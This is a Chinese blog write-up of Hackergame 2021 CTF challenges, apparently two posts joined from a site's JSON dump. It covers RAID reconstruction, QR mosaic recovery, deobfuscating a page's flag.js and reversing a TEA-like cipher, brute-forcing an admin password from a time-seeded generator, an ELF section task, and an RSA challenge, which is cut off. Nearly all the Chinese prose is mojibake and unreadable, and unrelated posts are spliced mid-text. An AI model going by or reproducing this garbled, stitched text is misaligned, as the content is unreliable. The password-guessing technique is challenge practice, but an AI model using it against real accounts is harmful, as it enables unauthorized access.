éœ€è¦è§£æå¾—åˆ°æ­£ç¡®å®Œæ•´çš„ç£ç›˜é˜µåˆ—ï¼ŒæŒ‚è½½ç¬¬ä¸€ä¸ªåˆ†åŒºååœ¨è¯¥åˆ†åŒºæ ¹ç›®å½•ä¸‹ä½¿ç”¨ Python 3.7 æˆ–ä»¥ä¸Šç‰ˆæœ¬æ‰§è¡Œ getflag.py è„šæœ¬ä»¥è·å– flagã€‚ç£ç›˜æ•°æ®ä¿è¯æ— æŸåã€‚ RAID 5è™½ç„¶ RAID 5 æ˜¯ç¬¬äºŒé—®ï¼Œè€Œä¸”åˆ†æ•°é«˜ï¼Œä½†æ˜¯æ›´å¥½åšï¼Œè€Œä¸”åšå‡ºçš„äººä¹Ÿå¤šã€‚å› ä¸ºæ•°æ®ä¿è¯æ— æŸåï¼Œæ‰€ä»¥è¦åšçš„ä»…ä»…æ˜¯æ‰¾å‡ºäº”ä¸ªç£ç›˜çš„é¡ºåºå’Œå—å¤§å° é¡ºåºå¯ä»¥å…ˆç®€å•åœ°çœ‹çœ‹ strings *.img è¾“å‡ºçš„å†…å®¹é€ä¸ªæ–‡ä»¶çœ‹ï¼Œå¯ä»¥å‘ç°æ¯ä¸ªæ–‡ä»¶æ¯”è¾ƒé å‰çš„åœ°æ–¹ä¼šæœ‰ä¸€æ®µæ˜¯ git å†å²è®°å½•çš„ä¸€éƒ¨åˆ†:æ ¹æ®é‡Œé¢çš„æ—¶é—´å¯ä»¥æ¨æ–­å‡ºç£ç›˜çš„é¡ºåºå¤§è‡´æ˜¯ï¼š Qj... -> 60... -> 3R... -> Ir... -> 3D... åªæ˜¯ï¼Œè¿™ä¸ªé¡ºåºåº”è¯¥æ˜¯ä¸€ä¸ªç¯ï¼Œè°åœ¨ç¬¬ä¸€è¿˜æ²¡åŒºåˆ†å‡ºæ¥ åœ¨çœ‹æ¯ä¸ªæ–‡ä»¶çš„å¤´éƒ¨ï¼Œåªæœ‰ 60â€¦ å’Œ 3Râ€¦ æœ‰ â€œEFI PARTâ€:æ‰€ä»¥åº”è¯¥æ˜¯ä¸€ä¸ªåœ¨å¼€å¤´ï¼Œä¸€ä¸ªåœ¨ç»“å°¾ã€‚æ‰€ä»¥æœ€ç»ˆçš„é¡ºåºæ˜¯ï¼š 3R... -> Ir... -> 3D... -> Qj... -> 60... ç„¶åéœ€è¦æ‰¾åˆ°å—å¤§å°ç›´æ¥ä¸¢åˆ° DiskGenius é‡Œç»„å»ºè™šæ‹Ÿ RAIDï¼Œé€‰å·¦åŒæ­¥ï¼Œç„¶åå¯ä»¥è¯•å‡ºæ¥å½“å—å¤§å°æ˜¯ 64k çš„æ—¶å€™æ­£å¥½å¯ä»¥æ‹¼å‡ºå®Œæ•´ç£ç›˜ç„¶åå…‹éš†ç£ç›˜ç”Ÿæˆ img æ–‡ä»¶ï¼Œå†æŒ‚è½½ï¼Œè¿›å…¥ï¼Œæ‰§è¡Œ getflag.py å°±å¾—åˆ°äº† flag RAID 0åœ¨åš RAID 5 çš„æ—¶å€™è¿˜å‘ç°äº†ä¸€ä¸ªå« Raid Reconstructor çš„è½¯ä»¶ï¼Œå¯ä»¥çˆ†ç ´ RAID é˜µåˆ—é¡ºåºå’Œå—å¤§å°æ‰€ä»¥è¿™é—®ä¹Ÿå°±æ‡’å¾—çœ‹äº†ï¼Œç›´æ¥ä¸¢ç»™ Raid Reconstructor æ¥çˆ†ç ´ï¼Œå¾—åˆ°æœ€æ¨èçš„é¡ºåºï¼š wl. -> jC. -> 1G. -> 5q. -> d3. -> eR. -> RA. -> ID. å’Œå—å¤§å° 128k ç„¶åç›´æ¥ç”¨ Raid Reconstructor çš„ Copy å¯¼å‡º img æ–‡ä»¶ï¼Œæå–ååˆå¾—åˆ°ä¸€ä¸ªæ–°çš„ img æ–‡ä»¶é€šè¿‡ file å¯ä»¥çœ‹åˆ°ç»“æœçš„æ–‡ä»¶ç³»ç»Ÿæ˜¯ XFS 12$ file MyDisk.imgMyDisk.img: SGI XFS filesystem data (blksz 4096, inosz 512, v2 dirs) ä½†æ˜¯å§‹ç»ˆæ— æ³•æŒ‚è½½ï¼ˆæäº†ä¸€å¤©ï¼‰å¯èƒ½æ˜¯ Raid Reconstructor çš„é—®é¢˜ï¼Œæ‰€ä»¥åˆç”¨ DiskGenius è¯•äº†ä¸‹å› ä¸º win å’Œ DiskGenius è¯»ä¸äº† XFS æ–‡ä»¶ç³»ç»Ÿï¼Œæ‰€ä»¥æ‹¼èµ·æ¥ä¹‹åç›´æ¥å…‹éš†å‡º img æ–‡ä»¶ç„¶åæ‹–åˆ° Kali Linux é‡ŒæŒ‚è½½ï¼ŒæˆåŠŸæŒ‚è½½åè¿›å…¥ã€è¿è¡Œ getflag.py å°±å¾—åˆ°äº† flag é©¬èµ›å…‹ï¼ˆè¿™é“é¢˜å·²ç»åšç ´é˜²äº†ï¼Œæœ¬ä»¥ä¸ºæ˜¯ä¸ªé’é“œï¼Œç»“æœæ˜¯ä¸ªç‹è€…â€¦â€¦ï¼‰æˆ‘åšçš„è‚¯å®šä¸æ˜¯æ­£è§£ï¼Œåˆ©ç”¨äºŒç»´ç çº é”™èƒ½åŠ›å‹‰å¼ºæ‹¿åˆ°äº† flagï¼Œæ‰€ä»¥å°±ä¸è¯¦ç»†å†™ writeup äº†ï¼Œä¸»è¦è¿˜æ˜¯è¦çœ‹å®˜æ–¹ wpï¼ˆé€ƒ å¤§æ¦‚æ­¥éª¤å°±æ˜¯ï¼š è¯»å›¾ç‰‡ æŠŠå·²çŸ¥çš„åƒç´ æå–å‡ºæ¥ æŠŠå››ä¸ªå°å®šä½å—å¡«ä¸Š æŒ¨ä¸ªé©¬èµ›å…‹å—å¯»æ‰¾ä½¿è¿˜åŸçš„æ•°æ®å¹³å‡æ•°ä¸åŸé©¬èµ›å…‹å€¼å·®çš„ç»å¯¹å€¼å°äº1çš„å¡«è¡¥æ–¹æ³• å¦‚æœåªæœ‰ä¸€ç§å°±å¡«ä¸Šï¼Œå¹¶ä¸”æ ‡æ³¨å·²ç»å¡«å¥½ï¼Œä»¥åä¸å†æœå¯» å¦‚æœæœ‰å¤šç§å°±å…ˆæ”¾ä¸‹ä¸å¡« é‡å¤4çš„è¿‡ç¨‹ï¼Œè¿™æ˜¯è¿˜ä¼šæœ‰å”¯ä¸€ç¡®å®šçš„å¡«è¡¥æ–¹æ¡ˆã€‚é‡å¤4æ¬¡å¤§æ¦‚å°±ä¸å‰©å”¯ä¸€è§£äº† è¿™æ—¶é‡å¤4ï¼Œæ‰¾å‡ºä»…æœ‰2ä¸­å¡«è¡¥æ–¹æ³•çš„ï¼Œé€‰è¯¯å·®æœ€å°çš„å¡«ä¸Š ç„¶åå†é‡å¤4 ç„¶åé‡å¤6 ç„¶åé‡å¤4 è¿™æ—¶å¯ä»¥çœ‹åˆ°å·²ç»è¿˜åŸå¾—å·®ä¸å¤šäº†ï¼Œå‰©ä¸‹çš„ä¸ç®¡ç›´æ¥æ‰«ç ä¹Ÿå¯ä»¥æ‰«å‡º flag äº† çœ‹ï¼Œåšæ³•å¾ˆçƒ‚å¯¹å§ minecRaft kk åŒå­¦å¾ˆå–œæ¬¢ç© Minecraftï¼Œä»–æœ€è¿‘æ”¶åˆ°äº†ä¸€å¼  MC åœ°å›¾ï¼Œåœ°å›¾é‡Œé¢æœ‰ä¸‰ç›ç¯ï¼Œè¿˜æœ‰å¾ˆå¤šå¥‡å¥‡æ€ªæ€ªçš„å‹åŠ›æ¿ã€‚ ä½†ä»–å‘ç°è¿™äº›ç¯å¥½åƒä¸å¤ªç¬¦åˆ MC ç”µç£å­¦ï¼ˆRed stoneï¼‰ï¼Œä½ èƒ½å¸®ä»–æŠŠç¯å…¨éƒ¨ç‚¹äº®å—ï¼Ÿ æ³¨ï¼šæœ¬é¢˜è§£æ³•ä¸åŸç‰ˆ Minecraft æ¸¸æˆæ— å…³ã€‚ è¡¥å……è¯´æ˜ï¼šflag èŠ±æ‹¬å·å†…ä¸ºè®©ä¸‰ç›ç¯å…¨éƒ¨ç‚¹äº®çš„æœ€çŸ­çš„è¾“å…¥åºåˆ—ã€‚ä¾‹å¦‚ï¼Œå¦‚æœè¸©è¸å‹åŠ›æ¿è¾“å…¥çš„æœ€çŸ­çš„åºåˆ—ä¸º abcï¼Œåˆ™ç­”æ¡ˆä¸º flag{abc}ã€‚ è¿˜æŒºå¥½ç©çš„é¢˜ï¼Œåœ¨ç½‘é¡µä¸­æ¨¡æ‹Ÿäº†ä¸€ä¸ªmcå‡ºæ¥çœ‹æºç çœ‹åˆ°äº†å¼•å…¥äº† flag.js æ–‡ä»¶ï¼Œæ‰€ä»¥å¯èƒ½å°±æ˜¯è¦é€šè¿‡å®ƒæ¥å¾—åˆ°ç­”æ¡ˆï¼š 1&lt;script src=&quot;jsm/miscs/flag.js&quot;&gt;&lt;/script&gt; ä¹Ÿå¯ä»¥çœ‹åˆ°ï¼Œæœ€ç»ˆåˆ¤æ–­æ˜¯å¦æ­£ç¡®æ˜¯é€šè¿‡è°ƒç”¨ gyflagh(input) æ˜¯å¦ä¸º true æ¥åˆ¤æ–­ï¼Œè€Œ gyflagh ä¹Ÿåœ¨ flag.js ä¸­ï¼Œæ‰€ä»¥è¿˜æ˜¯è¦çœ‹ flag.js ä½†æ˜¯ flag.js æ˜¯ç»è¿‡ç®€å•æ··æ·†è¿‡çš„ï¼Œè¿˜æ˜¯è¦è´¹ç‚¹æ—¶é—´è¯»ä¸€ä¸‹ å…¶ä¸­æœ‰å››ä¸ªè½¬æ¢ Str4 Base16 å’Œ Long çš„å‡½æ•°å¯ä»¥ç•¥æ‰ä¸ç®¡æ³¨æ„åˆ°äº† _0x381b() è¿™ä¸ªå‡½æ•°é‡Œæœ‰ä¸€ä¸ªåˆ—è¡¨ï¼Œè€Œä¸”æ¯”è¾ƒç®€å•ï¼Œå…¶å®å®ƒè¿”å›çš„å°±æ˜¯è¿™ä¸ªåˆ—è¡¨ 1['encrypt', '33MGcQht', '6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c', '14021KbbewD', 'charCodeAt', '808heYYJt', '5DlyrGX', '552oZzIQH', 'fromCharCode', '356IjESGA', '784713mdLTBv', '2529060PvKScd', '805548mjjthm', '844848vFCypf', '4bIkkcJ', '1356853149054377', 'length', 'slice', '1720848ZSQDkr'] ä½†æ˜¯åœ¨ Console é‡Œé¢è°ƒç”¨ _0x381b å¾—åˆ°çš„å´æ˜¯ä»¥ â€˜sliceâ€™ å¼€å¤´ã€â€™lengthâ€™ ç»“å°¾çš„åˆ—è¡¨ï¼Œå°†è¿™ä¸ªåˆ—è¡¨è®°ä¸º lst æ–¹ä¾¿è¡¨è¿°è€Œä¸”æºç ä¸­åªæœ‰æœ€å¼€å¤´çš„è°ƒç”¨åŒ¿åå‡½æ•°é‡Œé¢æœ‰ ['push'] å’Œ ['shift']ï¼Œæ‰€ä»¥æ¨æµ‹è¿™ä¸ªåŒ¿åå‡½æ•°å°±æ˜¯å°†è¿™ä¸ªåˆ—è¡¨å¾ªç¯å³ç§»ä¸¤ä¸ªä½ç½®é‚£è¿™ä¸ªåŒ¿åå‡½æ•°ä¹Ÿä¸ç”¨çœ‹äº† å†æ¥çœ‹ _0x2c9e() è¿™ä¸ªå‡½æ•°ï¼š 12345678910function _0x2c9e(_0x49e6ff, _0x310d40) { const _0x381b4c = _0x381b(); return _0x2c9e = function(_0x2c9ec6, _0x2ec3bd) { _0x2c9ec6 = _0x2c9ec6 - 0x1a6; let _0x4769df = _0x381b4c[_0x2c9ec6]; return _0x4769df; } , _0x2c9e(_0x49e6ff, _0x310d40);} å…¶ä¸­ _0x381b4c æ˜¯åˆšåˆšè¯´çš„é‚£ä¸ªåˆ—è¡¨ lstã€‚ç„¶å return é‡Œé¢é‡æ–°å®šä¹‰äº† _0x2c9eï¼Œä½†æ˜¯æ–°çš„å®šä¹‰é‡Œç¬¬äºŒä¸ªå‚æ•°å¹¶æ²¡æœ‰ç”¨ï¼Œç„¶åè°ƒç”¨è¿”å›ï¼Œæ‰€ä»¥æ•´ä¸ªå‡½æ•°å°±ç›¸å½“äºï¼š 1234function _0x2c9e(_0x2c9ec6, ...) { _0x2c9ec6 = _0x2c9ec6 - 0x1a6; return lst[_0x2c9ec6];} 0x1a6 æ˜¯ 422ï¼Œæ‰€ä»¥æ•´ä¸ªå‡½æ•°ä¹Ÿå°±ç›¸å½“äº function(x) { return lst[x - 422]; }åŒæ—¶æ ¹æ®ç¬¬ä¸€è¡Œï¼Œç¨‹åºä¸­æ‰€æœ‰ _0x22517d ä¹Ÿæ˜¯è¿™ä¸ªå‡½æ•° ç„¶åçœ‹åˆ¤æ–­ç­”æ¡ˆçš„ gyflagh å‡½æ•° 1234567function gyflagh(_0x111955) { const _0x50051f = _0x22517d; let _0x3b790d = _0x111955[_0x50051f(0x1a8)](_0x50051f(0x1b7)); if (_0x3b790d === _0x50051f(0x1aa)) return !![]; return ![];} æ²¡å•¥ç‰¹åˆ«çš„ï¼Œç»“åˆ lst å¯ä»¥å¾—åˆ°ï¼š 123456function gyflagh(ans) { if (ans[&quot;encrypt&quot;](&quot;1356853149054377&quot;) === &quot;6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c&quot;) { return true; } return false;} ç„¶åå°±å¯ä»¥ç»“åˆ lst ä¸­çš„å€¼å’Œç´¢å¼•ï¼Œç¿»è¯‘å‡ºæœ€é‡è¦çš„å‡½æ•°å†è¿›è¡Œä¸€äº›è¿ç®—ï¼Œç”¨æ³¨é‡Šæ ‡æ³¨ä¸€ä¸‹å·²çŸ¥çš„å€¼å°±å¯ä»¥å¾—åˆ°ï¼š 1234567891011121314String[&quot;prototype&quot;][&quot;encrypt&quot;] = function(key) { // key = &quot;1356853149054377&quot; const left = new Array(2); const right = new Array(4); let res = &quot;&quot;; ans = escape(this); // this := ans right = [909456177, 825439544, 892352820, 926364468] for (var i = 0; i &lt; ans[&quot;length&quot;]; i = i + 8) { left[0] = Str4ToLong(ans[&quot;slice&quot;](i, i + 4)); left[1] = Str4ToLong(ans[&quot;slice&quot;](i + 4, i + 8)); code(left, right); res = res + (LongToBase16(left[0]) + LongToBase16(left[1])); } return res; // 6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c}; å†æ¥çœ‹ code å‡½æ•°ï¼Œæ ¹æ® &lt;&lt; 4ã€ ^ã€ &gt;&gt;&gt; 5 å¯ä»¥å¤§èƒ†æ¨æµ‹ç±»ä¼¼ TEAï¼Œç„¶åè§£ç å°±ç›´æ¥ç¿»è¿‡æ¥å°±å¥½äº†ï¼š 12345678function dec(left, right) { for (var i = 2654435769 * 32; i != 0;) { left[1] -= ((left[0] &lt;&lt; 4 ^ left[0] &gt;&gt;&gt; 5) + left[0] ^ i + right[i &gt;&gt;&gt; 11 &amp; 3]); i -= 2654435769; left[0] -= ((left[1] &lt;&lt; 4 ^ left[1] &gt;&gt;&gt; 5) + left[1] ^ i + right[i &amp; 3]); } console.log(left);} æœ€åæŠŠè¦å¾—åˆ°çš„ res åˆ†å—ï¼Œæ¯ 8 ä¸ªä¸€ç»„ï¼š 16fbde674 819a59bf a1209256 5b4ca2a7 a11dc670 c678681d af4afb67 04b82f0c ç„¶åä»åå¾€å‰ï¼Œæ¯ä¸¤ä¸ªæ‰§è¡Œ Base16ToLongï¼Œç„¶åä½œä¸º left ä¼ ç»™ dec å‡½æ•°è§£ç ï¼Œç„¶åå† LongToStr4 å¾—åˆ°å››ä¸ªå­—ç¬¦:æ‹¼èµ·æ¥å°±æ˜¯ flag äº†ï¼šflag{McWebRE_inMlnCrA1t_3a5y_1cIuop9i} å¯†ç ç”Ÿæˆå™¨ å° T æœ€è¿‘åˆå†™äº†ä¸€ä¸ª web åº”ç”¨ã€‚ ä»–å‘ç°å¾ˆå¤šç”¨æˆ·éƒ½å–œæ¬¢è®¾ç½®å¼±å¯†ç ï¼Œäºæ˜¯å†³å®šè®©æ‰€æœ‰ç”¨æˆ·çš„å¯†ç éƒ½å¿…é¡»æ˜¯ 16 ä½é•¿ï¼Œå¹¶ä¸”å„ç§ç¬¦å·éƒ½è¦æœ‰ã€‚ä¸ºäº†è®©å¤§å®¶å¯ä»¥æ–¹ä¾¿ç”Ÿæˆè¿™æ ·çš„å¯†ç ï¼Œä»–è¿˜å†™äº†ä¸€ä¸ªå¯†ç ç”Ÿæˆå™¨ï¼Œè®©ç”¨æˆ·å¯ä»¥ç”Ÿæˆç¬¦åˆè§„åˆ™çš„å¯†ç ã€‚ ä½†è¿™æ ·æœçœŸå®‰å…¨å—ï¼Ÿ ï¼ˆæ„Ÿè§‰è¿™æ¬¡ Hackergame é¢˜çš„ tag éƒ½å¾ˆè¯¡å¼‚ã€‚è¿™é¢˜æ˜æ˜æ˜¯ misc(general) ä¸ºä»€ä¹ˆæ‰“äº† binary çš„ tagï¼‰ çœ‹åˆ° binary tag ç›´æ¥å…ˆå¾€ IDA é‡Œé¢ä¸¢ï¼Œç„¶åæŠ¥é”™äº†ï¼Œå¤§æ¦‚æ˜¯å› ä¸ºéƒ¨åˆ† winapi å¯¼å…¥ä¸è¿›å»çš„é—®é¢˜ï¼ˆï¼Ÿï¼‰ç„¶åå°±ä¸ä¼šäº†â€¦â€¦ å¯¹ç€ IDA å¹²çªçœ¼ çœ‹é¢˜ï¼Œé¢˜ç›®ç»™äº†ä¸€ä¸ªç½‘ç«™ï¼Œç”¨æ¥å‘å¸ƒå±•æ¿ï¼Œçœ‹èµ·æ¥åªæœ‰ admin ç”¨æˆ·ï¼Œè€Œä¸”æ²¡æœ‰æ³¨å†Œç³»ç»Ÿï¼Œæ‰€ä»¥åº”è¯¥å°±æ˜¯è¦æåˆ° admin çš„å¯†ç äº†å†ç»†çœ‹ç½‘ç«™ï¼Œç‰¹æ„æåˆ° â€œç½‘é¡µæ˜¾ç¤ºæ—¶é—´â€ï¼Œè€Œä¸”å±•æ¿åé¢éƒ½æœ‰å‘å¸ƒæ—¶é—´ï¼Œç‚¹è¿› admin çš„ç”¨æˆ·é¡µé¢å‘ç°ä¹Ÿæœ‰æ³¨å†Œæ—¶é—´ï¼Œç€å®æœ‰äº›è®¸è¯¡å¼‚ï¼ˆæ‰€ä»¥æ—¶é—´åº”è¯¥æ˜¯ä¸€ä¸ªæç¤º è€Œå†™ä»£ç çš„æ—¶å€™è®¾ç½®éšæœºæ•°ç§å­åˆå¸¸ä»¥å½“å‰æ—¶é—´ä½œä¸ºç§å­ï¼Œæ‰€ä»¥ç”Ÿæˆçš„å¯†ç å¯èƒ½æ˜¯å’Œæ—¶é—´æœ‰å…³ç³»çš„é€šè¿‡è°ƒç³»ç»Ÿæ—¶é—´ï¼Œå¯ä»¥å‘ç°åœ¨åŒä¸€ç§’ç‚¹ä¸‹ç”Ÿæˆï¼Œäº§ç”Ÿçš„å¯†ç æ˜¯ä¸€æ ·çš„æ‰€ä»¥åªéœ€è¦æŠŠç³»ç»Ÿæ—¶é—´è°ƒåˆ° admin çš„æ³¨å†Œæ—¶é—´å·¦å³ï¼Œç„¶åæ¯ç§’ç”Ÿæˆå¯†ç ï¼Œå†æŒ¨ä¸ªè¾“è¿›å»çˆ†ç ´å³å¯ æœ€åå¾—åˆ° 2021-09-22 23:10:53 æ—¶ç”Ÿæˆçš„å¯†ç  $Z=CBDL7TjHu~mEX å°±æ˜¯ admin çš„å¯†ç ç„¶åç™»å½•å³å¯åœ¨â€œæˆ‘çš„â€é‡Œçœ‹åˆ°ä¸€æ¡ç§å¯†å±•æ¿ï¼Œå†…å®¹æ˜¯ flag ï¼ˆå…¶å®è¿™é¢˜æå¾—é—¹å¿ƒçš„æ˜¯æ¯ç§’ç”Ÿæˆå¯†ç ï¼Œåƒæˆ‘è¿™æ ·çš„åŸå§‹äººåªä¼šåå¤è°ƒæ—¶é—´ç„¶åæ‰‹åŠ¨ç”Ÿæˆã€å¤åˆ¶ç²˜è´´ï¼Œç„¶åå†å¤åˆ¶ç²˜è´´æ£€éªŒå¯†ç ï¼‰ï¼ˆè€Œä¸”å…¶å®è¿™ä¸ªæ—¶é—´ä¹Ÿè¯•äº†å¾ˆé•¿æ—¶é—´ï¼Œè¯•äº† 23:11 çš„æ‰€æœ‰ç§’ï¼Œ15:11 çš„æ‰€æœ‰ç§’ï¼ˆè€ƒè™‘åˆ°äº†æåˆ°çš„æ—¶åŒºé—®é¢˜ï¼‰ï¼‰ï¼ˆç„¶åä¸€å…± 120s é‡Œä¹Ÿæ²¡æœ‰æ­£ç¡®å¯†ç ï¼Œå°±å¾ˆé—¹å¿ƒï¼Œæœ€åçš„æ—¶é—´æ˜¯ 23:11 çš„å‰ä¸€åˆ†é’Ÿé‡Œçš„â€¦â€¦æˆ‘å½“æ—¶ç”šè‡³æƒ³äº†ï¼Œè¿™äº›æ“ä½œåœ¨ä¸€åˆ†é’Ÿä¹‹å†…éƒ½èƒ½å®Œæˆï¼Œç„¶åå°±æ²¡è€ƒè™‘å‰ä¸€åˆ†é’Ÿç”Ÿæˆå¯†ç ã€åä¸€åˆ†é’Ÿæ³¨å†Œçš„é—®é¢˜â€¦â€¦ï¼‰ï¼ˆäºæ˜¯å°±æœ‰äº†ï¼š å¥½äº†ï¼Œæˆ‘åšä¸Šçš„é¢˜ä¹Ÿå°±è¿™äº›äº†ï¼Œå‹‰å‹‰å¼ºå¼ºæ··äº† 4k2ptæ²¡åšä¸Šçš„é¢˜ä¹Ÿå¥½å¤šï¼šAmnesia2ã€èµ›åšå¨æˆ¿23ã€ç¯ã€åªè¯»ã€ä¸€çŸ³äºŒé¸Ÿã€GPAã€é“¾ä¸Šé¢„è¨€å®¶ã€åŠ©è®°è¯2ã€Co-Programã€å¤–æ˜Ÿäººã€befunã€fzuuã€wishã€OIé€†å‘ï¼ˆè‰ï¼Œå¥½å¤šqwqï¼‰å‰©ä¸‹çš„å°±çœ‹å®˜æ–¹ Writeup äº†ï¼ˆ Reference RAID ç›¸å…³çš„å¥½å¤šæ–‡ç« ï¼Œæ²¡ç•™ä½œè®°å½•","link":"/p/d11ec8ed.html"},{"title":"ã€ŒHackergame 2021ã€#3 Writup æŒç»­ç ´é˜²ç¯‡ 0","text":"&lt; #2 #4 &gt; å®Œæˆäº†å‰é¢ä¸¤ç¯‡è¯´åˆ°çš„é‚£äº›é¢˜åï¼Œå‰©ä¸‹çš„å°±å¼€å§‹åå¤æŠ˜ç£¨æˆ‘äº†qwqæ¯å¤©åŸºæœ¬éƒ½è‚åˆ°ä¸€ç‚¹å·¦å³ï¼Œç”šè‡³å››äº”ä¸ªå°æ—¶æ¯«æ— æˆæœ_(Â´à½€`ã€ âˆ )__å…¶ä¸­æœ‰äº›é¢˜å›è¿‡å¤´æ¥çœ‹å…¶å®å¾ˆç®€å•ï¼Œä½†æ˜¯åšçš„æ—¶å€™å°±æ˜¯æ­»æ´»æƒ³ä¸å‡ºæ¥ï¼ˆ è¿™ç¯‡ Writeup é‡Œé¢æœ‰ï¼šAmnesia1ã€RSAã€LUKSã€MicroWorld Amnesiaè½»åº¦å¤±å¿† ä½ çš„ç¨‹åºåªéœ€è¦è¾“å‡ºå­—ç¬¦ä¸² Hello, world!ï¼ˆç»“å°¾æœ‰æ— æ¢è¡Œå‡å¯ï¼‰å¹¶æ­£å¸¸ç»“æŸã€‚ ç¼–è¯‘æŒ‡ä»¤ï¼šgcc -O file.c -m32 è¿è¡ŒæŒ‡ä»¤ï¼š./a.out ç¼–è¯‘å ELF æ–‡ä»¶çš„ .data å’Œ .rodata æ®µä¼šè¢«æ¸…é›¶ã€‚ ELFï¼ˆExecutable and Linkable Formatï¼‰æ˜¯ Linux ä¸‹å¸¸ç”¨çš„å¯æ‰§è¡Œæ–‡ä»¶æ ¼å¼ï¼Œå…¶ä¸­æœ‰å¾ˆå¤šä¸åŒçš„èŠ‚ï¼š .text èŠ‚ï¼šç¨‹åºè¿è¡Œéœ€è¦çš„ä»£ç  .data èŠ‚ï¼šå­˜æ”¾å¯ä¿®æ”¹çš„æ•°æ®ï¼Œä¸€èˆ¬æ˜¯é const å…¨å±€å˜é‡å’Œé™æ€å˜é‡ .rodata èŠ‚ï¼šå³ read only dataï¼Œä¸€èˆ¬æ˜¯å¸¸é‡æˆ–è€…å­—ç¬¦ä¸² .bss èŠ‚ï¼šæ²¡æœ‰è¢«åˆå§‹åŒ–çš„å˜é‡ â€¦â€¦ è€Œè¿™é“é¢˜ç›®åˆ™æ˜¯åœ¨ç¼–è¯‘ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ a.out åï¼Œæ¸…ç©º .data å’Œ .rodataé¦–å…ˆä¸å¦¨æ­£å¸¸ç¼–å†™ä¸€ä¸ªè¾“å‡º â€œHello, world!â€ çš„ç¨‹åºï¼š 1printf(&quot;Hello, world!\\n&quot;); ç„¶åç¼–è¯‘ï¼Œå†æ‹–åˆ° IDA é‡Œå¯ä»¥å‘ç°ï¼Œæ­¤æ—¶çš„ â€œHello, world!â€ è¢«æ”¾åˆ°äº† .rodata èŠ‚ä¸­ï¼Œä¼šè¢«æ¸…é™¤æ‰ï¼Œæ‰€ä»¥è¿™æ ·å†™ä¸è¡Œ ç›´æ¥ä½¿ç”¨å­—ç¬¦ä¸²ä¼šè¢«æ”¾åˆ° .rodata ä¸­æ¸…é™¤ï¼Œå†™æˆå…¨å±€å˜é‡åˆä¼šæ”¾åˆ° .data ä¸­ä½†æ˜¯ï¼Œå¦‚æœå†™æˆå±€éƒ¨å˜é‡å‘¢ï¼š 12char str[] = &quot;Hello, world!\\n&quot;;printf(str); ç¼–è¯‘ï¼Œæ‹–åˆ° IDA é‡Œå¯ä»¥çœ‹å‡ºï¼Œè¿™æ¬¡çš„å­—ç¬¦ä¸²ç›´æ¥å†™åˆ°äº† .text èŠ‚ä¸­ï¼Œåˆ æ‰äº† .data .rodata ä¹Ÿæ²¡æœ‰å½±å“æ‰€ä»¥æŠŠè¿™ä¸ªä»£ç äº¤ä¸Šå»å°±å¯ä»¥è¾“å‡º â€œHello, world!â€œ æ‹¿åˆ° flag äº† æ¸…é™¤è®°å¿†ç›´æ¥æŠŠ .text èŠ‚å…¨åˆ æ‰äº†ï¼Œæƒ³äº†å¾ˆä¹…ä¹Ÿä¸çŸ¥é“å’‹æï¼Œè™½ç„¶å¯ä»¥ __attribute__ ((section (â€œâ€¦â€))) æ¥æŠŠå‡½æ•°æˆ–å˜é‡å¡åˆ°æŒ‡å®šçš„èŠ‚ä¸­ã€‚ä½†è¿˜æ˜¯ä¸æ¸…æ¥šè¦æ€ä¹ˆè§£å†³æ®µé”™è¯¯çš„é—®é¢˜qwq Easy RSA è‡ªä» Hackergame 2018 å…¬ç„¶æ­éœ²äº†å¤§æ•´æ•°å¯ä»¥è¢«ç¥ç«¥å£ç®—åˆ†è§£çš„äº‹å®ï¼ŒRSA åœ¨ hackergame ä¸­å·²ç»åªèƒ½å¤„äºä½åˆ†å€¼çš„åœ°ä½äº†ã€‚å¦‚æœä¸åœ¨å…¶åç§°å‰é¢åŠ ä¸Š Easy è¿™ä¸ªå•è¯ï¼Œä¼¼ä¹å°±ä¼šæ˜¾å¾—å®Œå…¨å¯¹ä¸èµ·å…¶ä»–é¢˜ç›®ã€‚ æ›´ä½•å†µï¼Œåœ¨æœ¬é¢˜çš„é™„ä»¶ä¸­ï¼Œä½ è¿˜è·å¾—äº†æ„é€  p å’Œ q çš„æ–¹å¼ã€‚æ•°ç†åŸºç¡€æ‰å®çš„ä½ åº”è¯¥å¯ä»¥è½»æ¾è§£å†³è¿™äº›é—®é¢˜å§ã€‚ è°¢é‚€ï¼Œæ²¡æœ‰æ•°ç†åŸºç¡€ çœ‹ä»£ç ï¼ 12345678910111213141516171819202122232425262728293031e = 65537def get_p(): x = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391760451 y = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391661439 value_p = sympy.nextprime((math.factorial(y)) % x) # Hintï¼šè¿™é‡Œç›´æ¥è®¡ç®—ä¼šæº¢å‡ºï¼Œè¯·ä½ ä»”ç»†è§‚å¯Ÿ x å’Œ y çš„ç‰¹å¾ return value_pdef get_q(): value = [getPrime(256)] for i in range(1, 10): value.append(sympy.nextprime(value[i - 1])) print(&quot;value[-1] = &quot;, value[-1]) # value[-1] = 80096058210213458444437404275177554701604739094679033012396452382975889905967 n = 1 for i in range(10): n = n * value[i] q = getPrime(512) value_q = pow(q, e, n) print(&quot;value_q = &quot;, value_q) # value_q = 5591130088089053683141520294620171646179623062803708281023766040254675625012293743465254007970358536660934858789388093688621793201658889399155357407224541324547522479617669812322262372851929223461622559971534394847970366311206823328200747893961649255426063204482192349202005330622561575868946656570678176047822163692259375233925446556338917358118222905050574458037965803154233167594946713038301249145097770337253930655681648299249481985768272321820718607757023350742647019762122572886601905212830744868048802864679734428398229280780215896045509020793530842541217790352661324630048261329493088812057300480085895399922301827190211956061083460036781018660201163819104150988531352228650991733072010425499238731811243310625701946882701082178190402011133439065106720309788819 return sympy.nextprime(q)# this destroyes the rsa cryptosystemp = get_p()q = get_q()m = int.from_bytes(open(&quot;flag.txt&quot;, &quot;rb&quot;).read(), &quot;big&quot;)c = pow(m, e, p * q)print(&quot;c = &quot;, c)# c = 110644875422336073350488613774418819991169603750711465190260581119043921549811353108399064284589038384540018965816137286856268590507418636799746759551009749004176545414118128330198437101472882906564195341277423007542422286760940374859966152871273887950174522820162832774361714668826122465471705166574184367478 å¯ä»¥çœ‹åˆ°ï¼Œå…¶ä¸­è¦è§£å†³çš„å°±æ˜¯ get_p() ä¸­ y! % x 